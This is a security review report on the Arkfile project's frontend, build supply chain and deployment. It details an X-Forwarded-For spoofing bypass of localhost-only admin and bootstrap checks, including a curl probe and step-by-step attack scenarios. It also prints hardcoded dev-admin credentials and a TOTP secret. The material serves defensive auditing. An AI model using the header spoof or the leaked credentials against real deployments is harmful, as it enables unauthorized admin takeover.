# Slice F — Frontend / WASM / Supply Chain / Ops

Author: in-depth security review per `docs/wip/idsrp.md` §3 (frontend / WASM / TS), §12 (XSS), §13 (supply chain & build), §15 (deployment & operational), §14 residual (frontend telemetry), §22.1 (CLI binary build / supply chain).
Plan reference: `docs/wip/review/00-plan.md` §4 Slice F.

## 0. Scope

### `idsrp.md` sections covered here
- §3 Frontend / WASM / TypeScript surface — every `client/static/**` asset not already covered by an earlier slice's "TS in scope" subset.
- §12 XSS — every `innerHTML` sink in `client/static/js/src/**`, CSP, Trusted Types, source-map exposure, SVG/PDF preview risk.
- §13 Supply chain and build — Go modules, npm/Bun packages, vendored C submodules, WASM artifact, lockfile state, integrity checks (hash algorithms in use), build-flag inventory for `arkfile` / `arkfile-client` / `arkfile-admin` per `idsrp.md` §22.1.
- §15 Deployment and operational — Caddyfile family, systemd unit hardening, deployment-script content (file modes, secret placement on disk, sudo escalation as written), public health endpoints.
- §14 residual — frontend telemetry / log surfaces not already covered by Slices A–E (sourcemap exposure, error pages, service-worker logs).
- §22.1 — CLI binary supply chain (static vs dynamic linking, reproducibility flags, signing/provenance).

### `idsrp.md` sections deferred to other slices
- §4 OPAQUE / TOTP / JWT correctness, browser auth UX flows, agent daemon — **Slice A** owns; this slice only flags frontend storage of auth-derived secrets (F-07, F-08).
- §5 / §6 / §16 Argon2id / file encryption / key hierarchy — **Slice B**.
- §6 (cont.) chunked upload/download — **Slice C**.
- §7 / §11 sharing and share-related metadata — **Slice D**.
- §8 / §10 backend authz / admin / billing API surface — **Slice E**.
- TOTP middleware *implementation* correctness, two-tier JWT model — **Slice A**.

### Files actually read for this slice
- `main.go` — Echo setup, `e.IPExtractor` posture, `/healthz` + `/readyz` wiring, `initializeAdminUser` dev-admin seeding, TLS posture.
- `utils/environment.go` — production detection (`IsProductionEnvironment`); the entire env-var-fuzzy-match implementation.
- `handlers/middleware.go` (selected: `CSPMiddleware`, `AdminMiddleware`, `RequireTOTP`, `isLocalhostIP`, `parseIPAddress`, `RateLimitMiddleware`) — the CSP policy ground truth, the localhost-only admin gate (`c.RealIP()` call sites).
- `handlers/bootstrap.go` — admin bootstrap localhost gate (`c.RealIP()` call sites).
- `Caddyfile`, `Caddyfile.local`, `Caddyfile.test`, `Caddyfile.prod` — TLS posture, reverse-proxy block, `trusted_proxies` posture (absent), HSTS, `tls_insecure_skip_verify` for the localhost upstream.
- `systemd/arkfile.service`, `systemd/caddy.service`, `systemd/rqlite.service`, `systemd/seaweedfs.service` — full directive-by-directive review for §3.2.
- `scripts/setup/build.sh` (entire 590 LOC) — `go build` invocations for all three Go binaries (`arkfile`, `arkfile-client`, `arkfile-admin`), `CGO_LDFLAGS`, TypeScript build invocation, asset copy paths.
- `scripts/prod-deploy.sh` (selected: secrets.env writer, Caddy env-file writer, bootstrap-token instructions, deSEC token storage) — operator-visible secret surface as written.
- `scripts/maintenance/rotate-jwt-keys.sh` (head) — stale-vs-current question.
- `client/static/index.html`, `client/static/shared.html`, `client/static/theme-preview.html` (head), `client/static/errors/**` (presence check) — `<script>` references, inline `<style>` blocks, SRI posture.
- `client/static/js/package.json`, `client/static/js/bun.lock` (head) — dependency pins, build script invocation.
- `client/static/js/src/utils/auth.ts` — token storage (localStorage).
- `client/static/js/src/auth/totp.ts`, `client/static/js/src/auth/login.ts`, `client/static/js/src/auth/totp-setup.ts` — `window.totpLoginData` lifecycle, `innerHTML` modal sinks, inline `onclick=` handlers.
- Grep sweep across `client/static/js/src/**` for `innerHTML`, `localStorage.*`, `sessionStorage.*`, `window.*` globals.
- `config/dependency-hashes.json` — pinning posture for SeaweedFS and rqlite.
- `.gitmodules` — vendored C submodule pins.

### Files deliberately not read (or read only at the index level)
- Every file under `/opt/arkfile/etc/**` and any `.env` / `secrets.env` — blocked by `.clinerules`. Where a finding's escalation hinges on runtime file modes / contents under `/opt/arkfile/etc/`, the question is logged in §5.
- `vendor/stef/libopaque/**`, `vendor/stef/liboprf/**`, `client/static/js/libopaque.js` byte-for-byte — `00-plan.md` §2 treats the vendored C as trusted upstream; this slice only audits how the *artifact* is built, pinned, and served.
- `scripts/testing/**` — out of scope per `00-plan.md` §4 (Slice F).
- `_test.go` files (presence/absence noted; content not inspected here).

### Out-of-scope notes
- Attacker-via-operator threat modeling (a malicious admin running the deploy scripts) is deferred to Slice G's threat-model synthesis. This slice limits itself to "what is in the scripts today" so the evidence rule (§2 of `00-plan.md`) is satisfied with file:line evidence.
- Penetration testing or live deployment validation is explicitly out of scope per `00-plan.md` §9.

---

## 1. Architecture & Data-Flow Summary (for this slice)

### 1.1 Production request path

```
Internet  ─►  Caddy (:443, TLS 1.3, deSEC DNS-01)
              │   sets: Strict-Transport-Security
              │   reverse_proxy localhost:8443
              │      transport http { tls; tls_insecure_skip_verify }
              │   APPENDS (does not strip): X-Forwarded-For
              ▼
Arkfile Go process (Echo, :8443 TLS 1.3-only, also :8080 plaintext)
              │   middleware order:
              │     middleware.Recover
              │     middleware.SecureWithConfig (sets HSTS again, XSS-Protection, XFO=SAMEORIGIN)
              │     middleware.HTTPSRedirect
              │     handlers.TLSVersionCheck
              │     handlers.CSPMiddleware           : sets CSP, XFO=DENY (overrides above)
              │     handlers.PrivacyRequestLogger
              │     handlers.FloodGuardMiddleware
              │     middleware.CORSWithConfig
              │     environment-tagging middleware
              │   c.RealIP() = Echo default DefaultIPExtractor (walks X-Forwarded-For)
              │   no e.IPExtractor override -> XFF is trusted from any source
              ▼
            static assets / route_config.go handlers
```

Key facts that drive Slice F findings:

1. **There is no `e.IPExtractor` override** anywhere in `main.go`. `c.RealIP()` therefore walks `X-Forwarded-For` per Echo's default. F-01 is the headline.
2. **Caddyfile.prod and Caddyfile.test do not declare `trusted_proxies`** and do not strip incoming `X-Forwarded-For`. Caddy *appends* its own observed IP to the chain. The Go process sees both. Echo picks the **left-most** header value by default, which is attacker-controlled.
3. **CSP is emitted exclusively by `handlers.CSPMiddleware`** (Go), not by Caddy. All three Caddyfiles (local, test, prod) intentionally omit CSP and explicitly document why: duplicate CSP would intersect with the Go-set policy.
4. **TLS termination happens in Caddy.** The Arkfile process listens on `:8443` with a self-signed cert generated by `scripts/setup/04-setup-tls-certs.sh`. Caddy reverse-proxies over that internal TLS with `tls_insecure_skip_verify`. Acceptable because both ends are on localhost.

### 1.2 Static asset layout

```
client/static/
├── index.html                      <script src="/js/libopaque.js"></script>      <-- F-04 (no SRI)
│                                   <script src="/js/dist/app.js"></script>       <-- F-04 (no SRI)
├── shared.html                     same; also has inline <style> block 8-40       <-- F-15
├── theme-preview.html              dev page
├── favicon.ico
├── css/{styles.css,home.css,...}
├── errors/                         static error pages
└── js/
    ├── libopaque.js                ~345 KB, checked into the repo (built via build-libopaque-wasm.sh)
    ├── libopaque.debug.js
    ├── shared-init.js              tiny non-module bootstrap script
    ├── sw-download.js              built from src/sw-download.ts (Service Worker)
    ├── package.json                ^-pinned deps; bun.lock alongside
    ├── bun.lock                    text format (good, reviewable)
    ├── src/                        ~58 TS files; all build into dist/app.js
    └── dist/
        ├── app.js                  bundled+minified IIFE (build:prod)
        └── app.js.map              external sourcemap (build:prod default)  <-- F-22
```

### 1.3 Build pipeline (Go binaries)

```
scripts/setup/build.sh
├── check_go_version
├── go mod download / vendor (with libopaque/liboprf submodule preservation dance)
├── build_static_dependencies
│   └── scripts/setup/build-libopaque.sh  (compiles vendor/stef/libopaque/**/*.c)
├── build-libopaque-wasm.sh                (emscripten -> client/static/js/libopaque.js)
├── bun install                            (NO --frozen-lockfile)                F-13
├── bun run build:prod                     (minify + sourcemap=external)         F-22
└── build_go_binaries_static
    CGO_ENABLED=1
    CGO_CFLAGS=-I./vendor/stef/libopaque/src -I./vendor/stef/liboprf/src
    CGO_LDFLAGS=-L... -lopaque -loprf $(pkg-config --libs --static libsodium)    F-06
    STATIC_LDFLAGS='-extldflags "-static"'                                       F-05
    go build -a -ldflags "$STATIC_LDFLAGS" -o .../arkfile         .              F-05
    go build -a -ldflags "$STATIC_LDFLAGS" -o .../arkfile-client  ./cmd/...      F-05
    go build -a -ldflags "$STATIC_LDFLAGS" -o .../arkfile-admin   ./cmd/...      F-05

Missing across all three:
  -trimpath, -buildid=, -ldflags '-s -w', -buildvcs=false
  no release signing (cosign / minisign / sigstore), no SLSA attestation, no SBOM.
```

### 1.4 Supply chain pinning

| Dependency | Pinning mechanism | State today | Finding |
|---|---|---|---|
| Go modules | `go.sum` | Pinned by hash | OK |
| Vendored C: libopaque | `.gitmodules` (commit `6e9ac92`) | Pinned | OK |
| Vendored C: liboprf | `.gitmodules` (commit `a8c0410`) | Pinned | OK |
| Vendored C: libsodium | `pkg-config --libs --static libsodium` against host package | **Unpinned** | **F-06** |
| WASM artifact (`libopaque.js`) | Checked into repo, no checksum, no SRI tag | Built from source but no hash pin at serve time | **F-04** |
| npm deps via Bun | `package.json` uses `^` ranges; `bun.lock` exists in the working tree | Lockfile present, but `bun install` runs without `--frozen-lockfile` | **F-13** |
| SeaweedFS release | `config/dependency-hashes.json` records `md5_url` | **MD5** | **F-11** |
| rqlite | "built from source" — no commit / tag pin | Unpinned | **F-12** |

### 1.5 Production runtime layout

```
systemd units (/etc/systemd/system/*.service installed by build.sh):

arkfile.service   User=arkfile  EnvironmentFile=-/opt/arkfile/etc/secrets.env  ExecStart=/opt/arkfile/bin/arkfile
caddy.service     User=caddy    EnvironmentFile=/var/lib/caddy/caddy-env       (DESEC_TOKEN, 0600 caddy:caddy)   F-24
rqlite.service    User=arkfile  -http-addr :4001  -raft-addr :4002             (binds 0.0.0.0)                   F-10
seaweedfs.service User=arkfile  -ip=127.0.0.1 -ip.bind=127.0.0.1 -s3.ip.bind=127.0.0.1  (loopback-only, good)

All four units share these hardening directives (present):
  NoNewPrivileges, ProtectSystem (strict on arkfile/caddy; full on rqlite/seaweedfs), ProtectHome,
  PrivateTmp, ProtectKernelTunables, ProtectKernelModules, ProtectControlGroups.

arkfile.service and caddy.service additionally have: SystemCallFilter=@system-service, PrivateDevices.
rqlite.service has PrivateDevices but no SystemCallFilter.
seaweedfs.service has no PrivateDevices and no SystemCallFilter.

Missing across all four units (gaps in §3.2):
  LimitCORE=0, MemoryDenyWriteExecute, LockPersonality, RestrictAddressFamilies,
  RestrictNamespaces, RestrictSUIDSGID, ProtectClock, ProtectHostname,
  ProtectProc=invisible, ProcSubset=pid, CapabilityBoundingSet, UMask=0077, IPAddressDeny.
```

### 1.6 Frontend secret-adjacent storage

The browser holds the following "secret-adjacent" material at one time or another, all in same-origin reach of any executed JS (XSS, dependency compromise, dev-tool extension, etc.):

```
localStorage
  - 'token'              full JWT (lifetime ~30 min)                                       F-07
  - 'refresh_token'      refresh token (lifetime configured server-side)                   F-07

sessionStorage
  - OPAQUE login client-secret between the two-step login messages                         (Slice A)
  - OPAQUE register client-secret between the two-step register messages                   (Slice A)

window globals
  - window.totpLoginData = { tempToken, username, password, sessionKey, ... }              F-08
    Lives between OPAQUE-login-finalize and TOTP-verify. Password held in cleartext.

cookies
  - none used for auth tokens (intentional choice; documented in code comments)
```

The `password` field on `window.totpLoginData` is the largest concern. `auth/totp.ts:209-215` attempts to scrub it (`totpLoginData.password = ''; delete (totpLoginData as any).password`) but only after the TOTP-verify call returns. Any XSS, devtools observer, or compromised dependency that runs between login finalize and TOTP success can read the plaintext password.

---

## 2. Findings

Numbering is contiguous within this slice (`F-NN`). Severity per `00-plan.md` §2 and `idsrp.md` §18. Every finding cites file:line evidence.

### Finding F-01: `X-Forwarded-For` localhost-gate bypass via `c.RealIP()` walking attacker-controlled header

**STATUS: RESOLVED (2026-05-12).** Closed in commit-pending change set.
Code remediation:
- `main.go`: `e.IPExtractor = echo.ExtractIPDirect()` immediately after `echo.New()`, with security comment. The Go process no longer walks `X-Forwarded-For` for any purpose.
- `handlers/middleware.go`: added `peerAddrIsLoopback(c)` (kernel transport peer only -- never consults headers; the only correct primitive for localhost-only authz gates) and `publicClientIP(c)` (prefers Caddy-controlled `X-Arkfile-Peer` header for EntityID/rate-limit binning only -- never authz). `AdminMiddleware`, `RateLimitMiddleware`, and `RequireTOTP` updated. `isLocalhostIP` marked deprecated-for-authz.
- `handlers/bootstrap.go`: both `BootstrapRegisterResponse` and `BootstrapRegisterFinalize` now use `peerAddrIsLoopback(c)`.
- `logging/entity_id.go`: `GetOrCreateEntityID` now prefers `X-Arkfile-Peer` header, falls back to `c.RealIP()` for dev-without-Caddy. Raw IP still HMAC'd through the daily-rotating EntityID layer before any persistence.
- `Caddyfile`, `Caddyfile.prod`, `Caddyfile.test`, `Caddyfile.local`: every `reverse_proxy localhost:8443` block now includes `header_up -X-Forwarded-For`, `header_up -X-Real-IP`, `header_up -Forwarded`, and `header_up X-Arkfile-Peer {http.request.remote.host}`.

Cross-slice impact: A-02, A-13, A-14, A-26, and E-14 (which escalated through F-01 into remote reachability) revert to their per-slice baseline severities. Per-finding fixes for those items still pending and tracked separately.

Regression tests: `handlers/middleware_test.go` and `handlers/bootstrap_test.go` add 11 tests that prove (a) `peerAddrIsLoopback` rejects forged-XFF requests from public peers, (b) `AdminMiddleware` returns 403 when a remote peer spoofs `X-Forwarded-For: 127.0.0.1`, (c) both bootstrap endpoints return 403 for the same scenario, (d) `publicClientIP` prefers `X-Arkfile-Peer` and ignores forged `X-Forwarded-For`, (e) loopback peers still pass the gate. All tests pass; full `go test ./handlers/... ./logging/... ./auth/... ./crypto/... ./billing/... ./models/... ./config/... ./utils/... ./storage/...` is green.

Privacy posture: unchanged. The AGENTS.md "no IP logging / no PII" guarantee continues to hold -- the raw IP still never reaches log lines, DB rows, or audit records; the EntityID HMAC pipeline is the privacy boundary and it was not touched. The fix only changed which header the IP is *read from*, not what is *persisted*.

The original finding analysis (preserved below for the audit trail):

- Severity: **Critical**
- Confidence: **High**
- Category: authorization / operational / privacy
- Component: `main.go`, `handlers/middleware.go`, `handlers/bootstrap.go`, `Caddyfile.prod`, `Caddyfile.test`
- Affected files/functions:
  - `main.go:244-303` (Echo construction; **no `e.IPExtractor` assignment** anywhere in the file),
  - `handlers/middleware.go:553-565` (`isLocalhostIP` and the `AdminMiddleware` localhost gate at line 562-565: `clientIP := parseIPAddress(c.RealIP()); if !isLocalhostIP(clientIP) { ... 403 }`),
  - `handlers/middleware.go:303` and `:536` and `:562` (other `c.RealIP()` call sites used for rate-limit keying and TOTP-event logging),
  - `handlers/bootstrap.go:35-39` and `:106-110` (admin-bootstrap localhost gate, also via `c.RealIP()`),
  - `Caddyfile.prod:9-46` (no `trusted_proxies` directive, no XFF stripping),
  - `Caddyfile.test:52-90` (mirrors prod; same gap).
- Description: Echo's default `c.RealIP()` walks the `X-Forwarded-For` header and returns the left-most value. The Arkfile process does **not** override `e.IPExtractor` in `main.go`, so any HTTP client (including a remote unauthenticated one) can send `X-Forwarded-For: 127.0.0.1` and have `c.RealIP()` return `127.0.0.1`. Caddy's reverse-proxy block in `Caddyfile.prod`/`.test` does not declare `trusted_proxies` and does not strip the incoming header before forwarding — Caddy *appends* its own observed IP to the chain rather than replacing it. The Go process sees the attacker-supplied left-most value first.

  Two privileged paths trust `c.RealIP()` for *authorization*, not just for privacy/rate-limit keying:

  1. `AdminMiddleware` (`handlers/middleware.go:559-629`) — refuses any non-loopback IP. With XFF spoofing this fails open and the entire `/api/admin/**` surface (51 endpoints, per Slice E §3.1) is reachable remotely.
  2. `handlers/bootstrap.go:35-39, 106-110` — the admin-bootstrap-token redemption flow also requires a loopback caller. With XFF spoofing a remote attacker can redeem the bootstrap token directly if they can also obtain it (see F-03).

  This is a defense-in-depth failure that elevates two existing Medium/High findings (Slice E E-14, Slice A A-02/A-13/A-14/A-26) into a single Critical headline.

- Evidence:
  ```go
  // main.go:244-303 — Echo creation; grep shows no IPExtractor anywhere
  e := echo.New()
  ...
  // (no e.IPExtractor = ... line in main.go)
  ```
  ```go
  // handlers/middleware.go:553-565
  func isLocalhostIP(ip net.IP) bool {
      return ip.IsLoopback() || ip.Equal(net.ParseIP("127.0.0.1")) || ip.Equal(net.ParseIP("::1"))
  }

  func AdminMiddleware(next echo.HandlerFunc) echo.HandlerFunc {
      return func(c echo.Context) error {
          clientIP := parseIPAddress(c.RealIP())
          if !isLocalhostIP(clientIP) {
              return echo.NewHTTPError(http.StatusForbidden, "Admin endpoints only available from localhost")
          }
  ```
  ```go
  // handlers/bootstrap.go:35-39
  ip := c.RealIP()
  ```
  ```
  # Caddyfile.prod:27-36 — no trusted_proxies, no header stripping
  reverse_proxy localhost:8443 {
      transport http { tls; tls_insecure_skip_verify }
      health_uri /readyz
      ...
  }
  ```
- Attack scenario:
  1. Attacker discovers `test.arkfile.net` (or any other Arkfile deployment) on the public internet.
  2. Sends `GET /api/admin/users` with `X-Forwarded-For: 127.0.0.1` and a forged/captured admin JWT (e.g. via a separate XSS in F-07 or replay of a leaked JWT).
  3. `c.RealIP()` returns `127.0.0.1`. `AdminMiddleware` passes the localhost gate.
  4. The admin user lookup either succeeds (token had an admin JWT) or fails (token does not). The localhost protection that the threat model assumed is no longer present.
  5. Same path lets a remote attacker redeem a leaked bootstrap token (F-03) without local shell access.
- Impact: All localhost-only protections that depend on `c.RealIP()` are bypassable from anywhere on the internet. With a stolen admin JWT (XSS / refresh-token theft / journalctl access) the entire admin surface in Slice E is reachable. With a leaked bootstrap token the attacker can seed the first admin remotely.
- Recommendation:
  1. Set `e.IPExtractor` explicitly in `main.go` to Echo's `ExtractIPFromXFFHeader` configured with a `TrustOption` list that contains **only** `127.0.0.1/32` and `::1/128`. With Caddy on localhost this matches the real proxy posture.
  2. In `Caddyfile.prod` and `Caddyfile.test`, replace the bare `reverse_proxy` with one that strips and replaces `X-Forwarded-For`:
     ```
     reverse_proxy localhost:8443 {
         header_up X-Forwarded-For {remote_host}
         ...
     }
     ```
     and / or add a `trusted_proxies private_ranges` block.
  3. For the two *authorization* call sites (`AdminMiddleware`, `bootstrap.go`), do not trust `c.RealIP()` at all. Use `c.Request().RemoteAddr` (the TCP-level peer) which is guaranteed loopback when the request comes via Caddy on localhost. Header-based IPs are only safe for *non-authoritative* uses such as EntityID HMAC keying.
  4. Add a startup self-test that issues `GET /api/admin/users` with `X-Forwarded-For: 127.0.0.1` from a non-loopback TCP peer and asserts 403.
- Suggested tests:
  - End-to-end: from an off-host client send `curl -H "X-Forwarded-For: 127.0.0.1" https://example.com/api/admin/users` and assert 403.
  - End-to-end: same probe against `POST /api/bootstrap/*` and assert 403.
  - Unit: synthesize an `echo.Context` whose `Request().RemoteAddr` is `10.0.0.5:12345` and whose `X-Forwarded-For` is `127.0.0.1` and call `AdminMiddleware`; expect 403.
- Cross-refs: Slice A A-02, A-13, A-14, A-26; Slice E E-14, E-18.

---

### Finding F-02: Hardcoded dev-admin credentials and TOTP secret compiled into the production binary

- Severity: **Low**
- Confidence: **High**
- Category: design / operational / technical-debt / greenfield
- Component: `main.go`, `auth/dev_admin.go`, `utils/environment.go`, `config/config.go`
- Affected files/functions:
  - `main.go:705-783` (`initializeAdminUser`); the hardcoded constants at `main.go:723-725`,
  - `main.go:96` (calls `config.ValidateProductionConfig`),
  - `config/config.go:483-512` (`ValidateProductionConfig` — fail-closed startup abort),
  - `auth/dev_admin.go:23-45` (`CreateDevAdminWithOPAQUE` triple-layered security gate),
  - `utils/environment.go:11-57` (`IsProductionEnvironment`),
  - `utils/environment.go:60-75` (`IsDevAdminAccount`),
  - `scripts/dev-reset.sh:510` (`ADMIN_USERNAMES=arkfile-dev-admin` — dev-iteration tool, intentional),
  - `scripts/prod-deploy.sh:391`, `scripts/test-deploy.sh:391`, `scripts/local-deploy.sh:838` (all write `ADMIN_USERNAMES=${ADMIN_USERNAME}` from operator's `--admin-username` value).
- Description: The dev-admin auto-create path is the fixed credentials seeded by `initializeAdminUser` at `main.go:723-725`:

  ```go
  const devAdminUsername = "arkfile-dev-admin"
  const devAdminPassword = "DevAdmin2025!SecureInitialPassword"
  const devAdminTOTPSecret = "ARKFILEPKZBXCMJLGB5HM5D2GEVVU32D"
  ```

  Whether this seeding actually fires is guarded by **six sequential checks** across three files:

  | # | File:line | Check |
  |---|---|---|
  | 1 | `main.go:96` → `config/config.go:485-508` (`ValidateProductionConfig`) | Startup-time `log.Fatalf` if `IsProductionEnvironment()` AND any name in `ADMIN_USERNAMES` matches `utils.IsDevAdminAccount` (`arkfile-dev-admin`, `test-admin`, `dev-admin`). Server does not start. |
  | 2 | `main.go:709-713` (`initializeAdminUser`) | Blocks if `IsProductionEnvironment()`. |
  | 3 | `main.go:728-731` | Skips unless `strings.Contains(ADMIN_USERNAMES, "arkfile-dev-admin")`. |
  | 4 | `auth/dev_admin.go:29-32` (`CreateDevAdminWithOPAQUE`) | Re-checks `IsProductionEnvironment()`. |
  | 5 | `auth/dev_admin.go:34-38` | Refuses if `username != "arkfile-dev-admin"` exactly. |
  | 6 | `auth/dev_admin.go:40-45` | Re-verifies `strings.Contains(ADMIN_USERNAMES, username)`. |

  Deploy-script behavior:

  - `scripts/dev-reset.sh:510` hardcodes `ADMIN_USERNAMES=arkfile-dev-admin`. This is the intended dev-iteration path and triggers checks #2/#3/#5/#6 to *all* pass; the user gets seeded.
  - `scripts/prod-deploy.sh:391`, `scripts/test-deploy.sh:391`, and `scripts/local-deploy.sh:838` all write `ADMIN_USERNAMES=${ADMIN_USERNAME}`, where `${ADMIN_USERNAME}` is the operator-provided value from `--admin-username`. Check #3 (substring match against `arkfile-dev-admin`) and check #5 (exact-match) both fail, and seeding is skipped. A current `test.arkfile.net`-style deployment via `test-deploy.sh --admin-username <name>` correctly does not seed the dev admin.

  Check #1 (`ValidateProductionConfig`) is the fail-closed safety net: even if an operator does pass `--admin-username arkfile-dev-admin` to a production-bound script, the server refuses to start as long as `ENVIRONMENT=production` (or `NODE_ENV`/`GO_ENV`/`ENV`) is set. `IsProductionEnvironment()`'s hostname-substring and port heuristic (matching `prod`/`production`/`live` in the hostname, or `PORT ∈ {443,80,8443}`) is *additional* coverage on top of the explicit env-var marker.

  The combined defense is solid. The residual concern is **greenfield code hygiene** per `AGENTS.md`: hardcoded credentials and a fixed TOTP secret remain compiled into the production binary even though they are not reachable on a correctly-deployed instance. Anyone who obtains the binary (a release artifact, a backup, a compromised CI runner, a developer's laptop) can extract:

  - The dev-admin username (`arkfile-dev-admin`).
  - The dev-admin password (`DevAdmin2025!SecureInitialPassword`).
  - The dev-admin TOTP secret (`ARKFILEPKZBXCMJLGB5HM5D2GEVVU32D`).

  These constants are useful against any environment running `dev-reset.sh` (developer laptops, CI runners, forgotten test instances). They constitute a known-secret leak even when the production gates work correctly.

- Evidence:
  ```go
  // main.go:723-725
  const devAdminUsername = "arkfile-dev-admin"
  const devAdminPassword = "DevAdmin2025!SecureInitialPassword"
  const devAdminTOTPSecret = "ARKFILEPKZBXCMJLGB5HM5D2GEVVU32D"
  ```
  ```go
  // main.go:728-732
  if !strings.Contains(adminUsernames, devAdminUsername) {
      log.Printf("Dev admin username '%s' not in ADMIN_USERNAMES, skipping auto-creation", devAdminUsername)
      return nil
  }
  ```
  ```go
  // auth/dev_admin.go:27-45 (CreateDevAdminWithOPAQUE — layers 1-3)
  if utils.IsProductionEnvironment() {
      return nil, fmt.Errorf("SECURITY: Dev admin creation blocked in production environment")
  }
  if username != "arkfile-dev-admin" {
      return nil, fmt.Errorf("SECURITY: Only arkfile-dev-admin can be auto-created")
  }
  adminUsernames := os.Getenv("ADMIN_USERNAMES")
  if !strings.Contains(adminUsernames, username) {
      return nil, fmt.Errorf("SECURITY: Username not in ADMIN_USERNAMES")
  }
  ```
  ```go
  // config/config.go:484-508 (ValidateProductionConfig — startup-time fail-closed)
  func ValidateProductionConfig() error {
      if utils.IsProductionEnvironment() {
          ...
          for _, adminUsername := range cfg.Deployment.AdminUsernames {
              if utils.IsDevAdminAccount(adminUsername) {
                  return fmt.Errorf("FATAL: Dev admin account '%s' found in production ADMIN_USERNAMES - deployment blocked", adminUsername)
              }
          }
          ...
      }
      return nil
  }
  ```
- Attack scenario:
  - Not a remote-takeover path on a correctly-deployed instance. The realistic failure modes are:
    1. **Known-secret leak.** Anyone with read access to a built `arkfile` binary recovers the dev-admin credentials via `strings ./arkfile`. They can log in to any environment that runs `dev-reset.sh` (developer laptops, CI runners, forgotten test instances).
    2. **Operator misconfiguration corner case.** If an operator somehow runs the binary without `ENVIRONMENT=production` set (or any of the other `IsProductionEnvironment()` markers firing) **and** ends up with `arkfile-dev-admin` in `ADMIN_USERNAMES` (copy-pasted from a `dev-reset.sh` env, an explicit `--admin-username arkfile-dev-admin`, or a multi-admin list including it), the six-gate defense partially collapses: check #1 (`ValidateProductionConfig`) does not fire because the env var is absent, and the remaining gates pass. The auto-seed runs. Combined with F-01, this could be reached remotely. This scenario requires multiple operator errors and is mitigated by `IsProductionEnvironment()`'s hostname/port heuristics in most realistic prod setups.
- Impact: Defense-in-depth gap. Realistic risk is the known-secret leak across dev environments. The remote-takeover path requires operator misconfiguration that the existing six gates collectively make hard to reach.
- Recommendation:
  1. **Build-tag separation.** Move `initializeAdminUser` (`main.go:705-783`) and `auth/dev_admin.go` behind `//go:build dev`. Production builds (`go build` with no tags) would not contain the hardcoded constants and would not register the auto-seed path at all. The `dev-reset.sh` workflow would build with `-tags dev`. This eliminates the "binary leak == credential leak" failure mode entirely and aligns with the `AGENTS.md` greenfield posture.
  2. As a smaller fix in the meantime: change the constants to be loaded from an env var at startup (e.g. `DEV_ADMIN_PASSWORD`, `DEV_ADMIN_TOTP_SECRET`) which `dev-reset.sh` writes into the dev-only `secrets.env` and `prod-deploy.sh`/`test-deploy.sh`/`local-deploy.sh` never write. Production binaries would no longer contain the constants.
  3. Tighten `IsProductionEnvironment()`: drop the hostname-substring heuristic (matches `prod`/`production`/`live` literally) and the `PORT ∈ {443,80,8443}` heuristic. Require an explicit positive marker (`ENVIRONMENT=production` or equivalent) set by the deploy script. The current heuristics provide false-positive coverage but they also invite drift if an operator picks a hostname that happens to match — the explicit marker is more honest about intent.
  4. Have `scripts/prod-deploy.sh`, `scripts/test-deploy.sh`, and `scripts/local-deploy.sh` all unconditionally write `ENVIRONMENT=production` into `secrets.env`. This makes `ValidateProductionConfig`'s fail-closed abort an enforced part of every non-dev deploy, not a heuristic.
- Suggested tests:
  - Post-build: `strings ./build/bin/arkfile | grep -c -E 'DevAdmin2025|ARKFILEPKZBXCMJLGB5HM5D2GEVVU32D'` must return 0 after the build-tag separation lands.
  - Integration: boot the prod-tag binary with `ADMIN_USERNAMES=arkfile-dev-admin` and confirm seeding does not occur (the auto-create function should not be linked in).
  - Integration: boot the dev-tag binary with `ADMIN_USERNAMES=arkfile-dev-admin` and confirm seeding works as today.
  - Unit: `ValidateProductionConfig` with `ENVIRONMENT=production` + `ADMIN_USERNAMES=arkfile-dev-admin` returns the `FATAL:` error (regression test).
- Cross-refs: Slice F F-05 (release reproducibility — same binary-content concerns), Slice A A-26 (admin bootstrap path), Slice E E-12 (dev-test API gating).


---

### Finding F-03: Bootstrap token harvested from systemd journal — re-bootstrap by anyone with root + `journalctl`

- Severity: **High** (Critical when combined with F-01)
- Confidence: **High**
- Category: operational / authorization
- Component: `scripts/prod-deploy.sh`, `systemd/arkfile.service`, `handlers/bootstrap.go`
- Affected files/functions:
  - `scripts/prod-deploy.sh:1186` (operator instruction: `sudo journalctl -u arkfile --no-pager -n 250 | grep BOOTSTRAP`),
  - `systemd/arkfile.service:9-15` (no `StandardOutput=` / `StandardError=` redirection; logs default to journal),
  - `auth/bootstrap.go` (Slice A) — emits the bootstrap token via `log.Printf` / `logging.InfoLogger`.
- Description: The production-deploy flow emits the admin bootstrap token to standard output, which systemd captures in the journal. Operators are instructed to retrieve the token with `journalctl -u arkfile | grep BOOTSTRAP`. The token therefore lives in `/var/log/journal/**` indefinitely (until journal rotation, which on a default Debian/Ubuntu install is weeks).

  Two consequences:
  1. Anyone with root + `journalctl` (a sysadmin, a backup operator, a malicious LXC neighbor with shared-host journal access, an incident-response tool that ships logs off-host) can read the token. If the original deployer has not yet redeemed it, the secondary reader can register the first admin and own the system.
  2. Combined with F-01, the localhost gate on `/api/bootstrap/*` is bypassable. An attacker who obtains the token off-host (log forwarder, log-aggregation pipeline, off-site backup) can redeem it remotely with `X-Forwarded-For: 127.0.0.1`. Severity therefore escalates to Critical in deployments where logs are forwarded.

- Evidence:
  ```
  # scripts/prod-deploy.sh:1185-1191
  echo "  1. Check Arkfile logs for the bootstrap token:"
  echo "     sudo journalctl -u arkfile --no-pager -n 250 | grep BOOTSTRAP"
  ...
  echo "       bootstrap --token <BOOTSTRAP_TOKEN> --username ${ADMIN_USERNAME}"
  ```
  ```
  # systemd/arkfile.service (entire) — no StandardOutput=null or =append:/secure/path
  ```
- Attack scenario:
  1. Operator runs `scripts/prod-deploy.sh`. Bootstrap token is logged to journal.
  2. Operator is distracted; does not redeem the token within the window.
  3. A second user with `journalctl` access (legitimate sysadmin, off-host log forwarder, leaked log archive) retrieves the token.
  4. Attacker calls `POST /api/bootstrap/...` with the token. Per F-01, the localhost gate does not protect this endpoint from a remote attacker.
  5. The attacker is now the first admin.
- Impact: Re-bootstrap risk. The entire admin trust model depends on the first admin being the legitimate deployer. Any second reader of the journal can become that admin.
- Recommendation:
  1. **Do not log the bootstrap token.** Write it to a file under `/opt/arkfile/etc/` with mode `0600 root:root`, accessible only via a one-shot `arkfile-admin bootstrap --read-token` privileged command that consumes the file and deletes it. Operators redeem the token once and the file is gone.
  2. As a fallback, write the token only to stderr with a leading line such as `BOOTSTRAP_TOKEN_FOLLOWS_DO_NOT_LOG_THIS_LINE`, and have the deploy script capture stderr to a tmpfile that it `shred`s after operator confirmation.
  3. Combine with the F-01 fix so even a leaked token cannot be redeemed remotely.
